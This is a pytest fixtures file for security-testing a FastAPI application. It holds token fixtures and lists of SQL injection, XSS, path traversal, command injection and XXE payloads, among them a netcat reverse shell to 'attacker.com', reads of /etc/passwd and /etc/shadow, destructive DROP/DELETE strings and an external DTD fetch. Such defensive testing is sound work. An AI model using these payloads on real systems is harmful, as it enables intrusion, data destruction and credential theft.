"""
IPA Platform - Security Test Fixtures

Provides fixtures for security testing including:
- Unauthenticated client
- Client with expired token
- Client with invalid token
- Malicious payload generators

Author: IPA Platform Team
Version: 1.0.0
"""

import pytest
import pytest_asyncio
from httpx import AsyncClient, ASGITransport
from datetime import datetime, timedelta
import jwt
import os
import sys

# Import the FastAPI app
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', '..'))

from main import app


# =============================================================================
# Test Configuration
# =============================================================================

SECRET_KEY = os.getenv("SECRET_KEY", "test_secret_key_for_security_tests")
ALGORITHM = "HS256"


# =============================================================================
# Client Fixtures
# =============================================================================

@pytest_asyncio.fixture(scope="function")
async def unauthenticated_client() -> AsyncClient:
    """
    Create a client without authentication.

    Used to test that protected endpoints reject
    unauthenticated requests.
    """
    transport = ASGITransport(app=app)
    async with AsyncClient(
        transport=transport,
        base_url="http://test",
        timeout=30.0
    ) as client:
        yield client


@pytest_asyncio.fixture(scope="function")
async def client_with_expired_token() -> AsyncClient:
    """
    Create a client with an expired JWT token.
    """
    transport = ASGITransport(app=app)

    # Create expired token
    expired_payload = {
        "sub": "test_user_id",
        "exp": datetime.utcnow() - timedelta(hours=1),  # Expired 1 hour ago
        "iat": datetime.utcnow() - timedelta(hours=2),
    }
    expired_token = jwt.encode(expired_payload, SECRET_KEY, algorithm=ALGORITHM)

    async with AsyncClient(
        transport=transport,
        base_url="http://test",
        timeout=30.0,
        headers={"Authorization": f"Bearer {expired_token}"}
    ) as client:
        yield client


@pytest_asyncio.fixture(scope="function")
async def client_with_invalid_token() -> AsyncClient:
    """
    Create a client with an invalid/malformed JWT token.
    """
    transport = ASGITransport(app=app)

    async with AsyncClient(
        transport=transport,
        base_url="http://test",
        timeout=30.0,
        headers={"Authorization": "Bearer invalid_token_12345"}
    ) as client:
        yield client


@pytest_asyncio.fixture(scope="function")
async def client_with_wrong_signature() -> AsyncClient:
    """
    Create a client with a token signed with wrong key.
    """
    transport = ASGITransport(app=app)

    # Create token with wrong secret
    payload = {
        "sub": "test_user_id",
        "exp": datetime.utcnow() + timedelta(hours=1),
        "iat": datetime.utcnow(),
    }
    wrong_token = jwt.encode(payload, "wrong_secret_key", algorithm=ALGORITHM)

    async with AsyncClient(
        transport=transport,
        base_url="http://test",
        timeout=30.0,
        headers={"Authorization": f"Bearer {wrong_token}"}
    ) as client:
        yield client


# =============================================================================
# Malicious Payload Fixtures
# =============================================================================

@pytest.fixture
def sql_injection_payloads() -> list[str]:
    """
    Common SQL injection attack payloads.
    """
    return [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' UNION SELECT * FROM users --",
        "1; DELETE FROM workflows WHERE '1'='1",
        "admin'--",
        "' OR 1=1 --",
        "1' ORDER BY 1--+",
        "' AND '1'='1",
        "') OR ('1'='1",
        "-1' UNION SELECT 1,2,3--",
        "' WAITFOR DELAY '0:0:5'--",
    ]


@pytest.fixture
def xss_payloads() -> list[str]:
    """
    Common XSS attack payloads.
    """
    return [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "<body onload=alert('XSS')>",
        "'><script>alert('XSS')</script>",
        '"><script>alert("XSS")</script>',
        "<iframe src='javascript:alert(`XSS`)'></iframe>",
        '<a href="javascript:alert(\'XSS\')">Click</a>',
        "<div style=\"background:url('javascript:alert(1)')\">",
        "{{constructor.constructor('alert(1)')()}}",
        "${alert('XSS')}",
    ]


@pytest.fixture
def path_traversal_payloads() -> list[str]:
    """
    Path traversal attack payloads.
    """
    return [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc/passwd",
        "/etc/passwd%00.jpg",
        "....//....//....//etc/shadow",
    ]


@pytest.fixture
def command_injection_payloads() -> list[str]:
    """
    Command injection attack payloads.
    """
    return [
        "; ls -la",
        "| cat /etc/passwd",
        "& dir",
        "`whoami`",
        "$(cat /etc/passwd)",
        "|| whoami",
        "&& id",
        "; sleep 5",
        "| nc attacker.com 4444 -e /bin/sh",
    ]


@pytest.fixture
def xxe_payloads() -> list[str]:
    """
    XML External Entity (XXE) attack payloads.
    """
    return [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/evil.dtd">]><foo>&xxe;</foo>',
    ]


@pytest.fixture
def large_payload() -> str:
    """
    Generate a very large payload for DoS testing.
    """
    return "A" * 10_000_000  # 10 MB string


# =============================================================================
# Helper Functions
# =============================================================================

def generate_jwt_token(
    user_id: str,
    expires_delta: timedelta = timedelta(hours=1),
    extra_claims: dict = None
) -> str:
    """Generate a JWT token for testing."""
    payload = {
        "sub": user_id,
        "exp": datetime.utcnow() + expires_delta,
        "iat": datetime.utcnow(),
    }
    if extra_claims:
        payload.update(extra_claims)

    return jwt.encode(payload, SECRET_KEY, algorithm=ALGORITHM)
